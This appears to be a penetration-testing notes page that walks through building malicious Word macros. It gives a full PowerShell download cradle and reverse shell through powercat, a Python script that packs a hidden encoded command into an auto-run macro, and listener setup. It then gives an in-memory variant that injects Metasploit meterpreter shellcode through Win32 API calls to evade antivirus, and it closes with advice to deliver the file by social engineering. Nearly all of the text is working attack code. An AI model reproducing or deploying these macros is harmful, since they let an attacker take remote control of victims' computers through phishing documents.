### Process for generating malicious VBA Macro

1. Start with the following Powershell payload:
```powershell
$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<OurIP>/powercat.ps1');powercat -c <OurIP> -p 4444 -e powershell"
```
2. Base64 Encode with Powershell (nb. you _will_ get a different result if you just `echo <payload> | base64` in Bash, use the code below):
```powershell
$b64EncodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
$b64EncodedPayload
```
3. Feed the encoded payload as a command line arg to this Python script:
```python
import sys

print('''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
''')
payload = f"powershell.exe -nop -w hidden -e {sys.argv[1]}"
n = 50
for i in range(0, len(payload), n):
    print(f'    Str = Str + \"{payload[i:i+n]}\"')
print('\n    CreateObject("Wscript.Shell").Run Str')
print('End Sub')
```
4. With our macro ready spin up a Windows machine that has office on it and create a Word doc with filetype `.doc`. This should be the 1997-2003 flavour. Then navigate to `View -> Macros`. Create a new macro in the file you've created and copy the macro we produced in step 3 into it.
5. If necessary exfiltrate the file via SCP:
```powershell
scp macro.doc kali@<our IP>:/home/kali
```
make sure an SSH server is running on the Kali machine:
```bash
sudo systemctl start ssh
```
6. Before distributing ensure an HTTP server is running in the same directory as a copy of `powercat.ps1`:
```bash
python3 -m http.server 80
```
and finally ensure a netcat listener is waiting for the shell:
```bash
nc -nvlp 4444
```
7. Distribute the payload via social engineering or file upload based vuln.

### A More Subtle Malicious VBA Macro

The approach above is good, but not very subtle. It involves writing a file to disk, and launching Powershell, which may be considered spicy by Antivirus and Defender or other countermeasures present on a machine. The most subtle approach we could possibly take is to make calls to Win32 APIs directly from VBA and to launch a staged payload. This keeps everything in memory, with minimal footprint for the initial payload, involving as few other applications as possible, and writing nothing to disk.

The major drawback is that once the victim closes the Office application running the macro the shell dies. We have traded subtlety for persistence.

First, get an `msfconsole` multi/handler ready to receive a staged payload, staged is now preferred since it means a much smaller initial payload that needs to be inserted into the macro. Commands to get the handler going are as follows:
```bash
sudo msfconsole -q
```
```bash
use multi/handler
```
```bash
set payload windows/x64/meterpreter/reverse_https
```
```bash
set lhost 192.168.0.1
```
```bash
set lport 443
```
```bash
exploit
```

Now, use `msfvenom` to generate a VBA compatible bit of shellcode
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 EXITFUNC=thread -f vbapplication
```
Copy the output of the above into the `buf = Array(20, 30,50, ...` section of the marco below. Our full malicious Macro is as follows:
```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(20, 30, 40, ... )

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
